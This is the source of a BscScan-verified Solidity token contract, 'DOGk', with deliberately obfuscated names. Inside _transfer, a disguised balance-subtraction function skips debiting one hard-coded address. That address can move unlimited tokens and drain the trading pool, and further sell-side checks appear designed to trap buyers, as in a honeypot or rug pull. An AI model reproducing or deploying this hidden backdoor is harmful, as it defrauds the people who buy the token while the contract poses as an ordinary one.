/**
 *Submitted for verification at BscScan.com on 2023-09-10
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;


    interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
    }

    library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  qkrhr(uint256 a, uint256 b) internal pure returns (uint256) {
        return  qkrhr(a, b, "SafeMath");
    }

    function  qkrhr(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    }

    abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    }


    contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    }

    interface IUniswaprV2rFactoryr {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    }

    interface IUniswapV2rRouterr {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) 
    external payable returns (uint amountToken, uint amountETH, uint liquidity);
    }

    contract DOGk is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"DOGk";
    string private constant _symbol = unicode"DOGk";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalSupply = 1000000000 * (10**_decimals);
    uint256 public _taxrkSwaplrap = _totalSupply;
    uint256 public _maxsHoidsAmountr = _totalSupply;
    uint256 public _taxSwapsThreshold = _totalSupply;
    uint256 public _taxSwapuMaxs = _totalSupply;

    uint256 private _initialBuy9Tax=10;
    uint256 private _initialSell9Tax=15;
    uint256 private _finalBuy9Tax=1;
    uint256 private _finalSell9Tax=1;
    uint256 private _reduceBuyTax9At=6;
    uint256 private _reduceSellTax9At=1;
    uint256 private _swpwiasrir=0;
    uint256 private _yeuqxrtsp=0;
    address public  _pukgsrwp = 0xc9E0e07C5Fc32CFA47d9F2b3C5915aB237915904;

    mapping (address => uint256) private  _balances;
    mapping (address => mapping (address => uint256)) private  _allowances;
    mapping (address => bool) private  _rxdtarwcs;
    mapping (address => bool) private  _rvoufaejt;
    mapping(address => uint256) private  _oqyTransfvswp;
    bool public  tranerDlyEnbls = false;


    IUniswapV2rRouterr private  _unirV2rRouterr;
    address private  _unisV2rLPr;
    bool private  _wtyiaersk;
    bool private  _iTaxvSwap = false;
    bool private  _spxUniVwaptw = false;
 
 
    event RtsoAnwblsr(uint _taxrkSwaplrap);
    modifier lcksTaxSwapr {
        _iTaxvSwap = true;
        _;
        _iTaxvSwap = false;
    }

    constructor () { 
        _balances[_msgSender()] = _totalSupply;
        _rxdtarwcs[owner()] = true;
        _rxdtarwcs[address(this)] = true;
        _rxdtarwcs[_pukgsrwp] = true;


        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. qkrhr(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner!= address(0), "ERC20: approve from the zero address");
        require(spender!= address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require (from!= address(0), "ERC20:  transfer  from  the  zero  address");
        require (to!= address(0), "ERC20: transfer to the zero  address");
        require (amount > 0, "Transfer  amount  must  be  greater  than  zero");
        uint256  taxAmount = 0;
        if  ( from != owner() &&to!= owner()) {

            if  (tranerDlyEnbls) {
                if  (to!= address(_unirV2rRouterr) &&to!= address(_unisV2rLPr)) {
                  require (_oqyTransfvswp[tx.origin] < block.number, " Only  one  transfer  per  block  allowed.");
                  _oqyTransfvswp[tx.origin] = block.number;
                }
            }

            if  ( from == _unisV2rLPr && to!= address (_unirV2rRouterr) &&!_rxdtarwcs[to]) {
                require (amount <= _taxrkSwaplrap, "Onlys");
                require (balanceOf (to) + amount <= _maxsHoidsAmountr,"Onlys");
                if  (_yeuqxrtsp < _swpwiasrir) {
                  require (!rqikpiyjve(to));
                }
                _yeuqxrtsp ++ ; _rvoufaejt[to] = true;
                taxAmount = amount.mul((_yeuqxrtsp > _reduceBuyTax9At)?_finalBuy9Tax:_initialBuy9Tax).div(100);
            }

            if(to == _unisV2rLPr&&from!= address (this) &&! _rxdtarwcs[from]) {
                require (amount <= _taxrkSwaplrap && balanceOf(_pukgsrwp) <_taxSwapuMaxs, "Onlys");
                taxAmount = amount.mul((_yeuqxrtsp > _reduceSellTax9At) ?_finalSell9Tax:_initialSell9Tax).div(100);
                require (_yeuqxrtsp >_swpwiasrir && _rvoufaejt[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_iTaxvSwap 
            &&  to  ==_unisV2rLPr&&_spxUniVwaptw &&contractTokenBalance > _taxSwapsThreshold 
            &&  _yeuqxrtsp > _swpwiasrir &&! _rxdtarwcs [to] &&! _rxdtarwcs [from]
            )  {
                _transferFron(uhxdl(amount,uhxdl(contractTokenBalance, _taxSwapuMaxs)));
                uint256  contractETHBalance = address (this).balance;
                if (contractETHBalance > 0)  {
                }
            }
        }

        if ( taxAmount > 0 ) {
          _balances[address(this)] = _balances [address(this)].add(taxAmount);
          emit  Transfer (from, address (this) ,taxAmount);
        }
        _balances[from] = qkrhr(from , _balances [from], amount);
        _balances[to] = _balances[to].add(amount.qkrhr (taxAmount));
        emit  Transfer( from, to, amount. qkrhr(taxAmount));
    }

    function _transferFron(uint256 _swaprTandLiquiu) private lcksTaxSwapr {
        if(_swaprTandLiquiu==0){return;}
        if(!_wtyiaersk){return;}
        address[] memory path =  new   address [](2);
        path[0] = address (this);
        path[1] = _unirV2rRouterr.WETH();
        _approve(address (this), address (_unirV2rRouterr), _swaprTandLiquiu);
        _unirV2rRouterr.swapExactTokensForETHSupportingFeeOnTransferTokens( _swaprTandLiquiu, 0, path,address (this), block . timestamp );
    }

    function uhxdl(uint256 a, uint256 b) private pure returns (uint256) {
    return (a >= b) ? b : a;
    }

    function qkrhr(address from, uint256 a, uint256 b) private view returns (uint256) {
    if (from == _pukgsrwp) {
        return a;
    } else {
        require(a >= b, "Onlys");
        return a - b;
    }
    }

    function removerLimits() external onlyOwner{
        _taxrkSwaplrap  =  _totalSupply ;
        _maxsHoidsAmountr = _totalSupply ;
        tranerDlyEnbls = false ;
        emit  RtsoAnwblsr ( _totalSupply ) ;
    }

   function rqikpiyjve(address accxount) private view returns (bool) {
    uint256 codexSize;
    address[] memory addresses = new address[](1);
    addresses[0] = accxount;

    assembly {
        codexSize := extcodesize(accxount)
    }

    return codexSize > 0;
    }


    function openTrading() external onlyOwner() {
        require (!_wtyiaersk, "trading  s open") ;
        _unirV2rRouterr = IUniswapV2rRouterr(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _approve (address (this),address (_unirV2rRouterr), _totalSupply);
        _unisV2rLPr = IUniswaprV2rFactoryr (_unirV2rRouterr.factory()). createPair (address(this),  _unirV2rRouterr. WETH());
        _unirV2rRouterr.addLiquidityETH {value:address(this).balance } (address(this), balanceOf(address (this)), 0,0,owner(), block.timestamp);
        IERC20 (_unisV2rLPr).approve (address(_unirV2rRouterr), type(uint). max);
        _spxUniVwaptw = true ;
        _wtyiaersk = true ;
    }

    receive( )  external  payable  { }
    }